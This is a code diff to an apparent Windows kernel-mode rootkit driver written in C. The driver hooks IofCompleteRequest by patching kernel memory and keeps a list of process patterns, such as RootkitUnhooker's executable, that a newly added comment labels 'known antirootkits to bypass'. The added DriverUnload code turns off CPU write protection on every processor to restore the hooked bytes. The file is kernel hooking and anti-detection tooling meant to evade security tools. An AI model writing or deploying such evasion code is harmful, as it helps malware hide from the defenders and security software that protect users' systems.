@@ -40,6 +40,9 @@ func_IofCompleteRequest old_IofCompleteRequest = NULL;
 ULONG IofCompleteRequest_BytesPatched = 0;
 func_IofCompleteRequest f_IofCompleteRequest = NULL;
 
+/*
+    List of known antirootkits to bypass
+*/
 PWSTR m_wcKnownProcesses[] = 
 {
     L"*\\RKU*.EXE",
@@ -599,6 +602,24 @@ NTSTATUS __fastcall new_IofCompleteRequest(
 void DriverUnload(PDRIVER_OBJECT DriverObject)
 {   
     DbgMsg(__FILE__, __LINE__, "DriverUnload()\n");    
+    
+    if (f_IofCompleteRequest &&
+        old_IofCompleteRequest &&
+        IofCompleteRequest_BytesPatched > 0)
+    {        
+        // disable memory write protection
+        ForEachProcessor(ClearWp, NULL);                
+
+        // remove hook
+        RtlCopyMemory(f_IofCompleteRequest, old_IofCompleteRequest, IofCompleteRequest_BytesPatched);
+
+        // enable memory write protection
+        ForEachProcessor(SetWp, NULL);
+    }
+
+    LARGE_INTEGER Timeout = { 0 };
+    Timeout.QuadPart = RELATIVE(SECONDS(1));
+    KeDelayExecutionThread(KernelMode, FALSE, &Timeout);
 
     // remove notify routines
     PsSetCreateProcessNotifyRoutine(ProcessNotifyRoutine, TRUE);
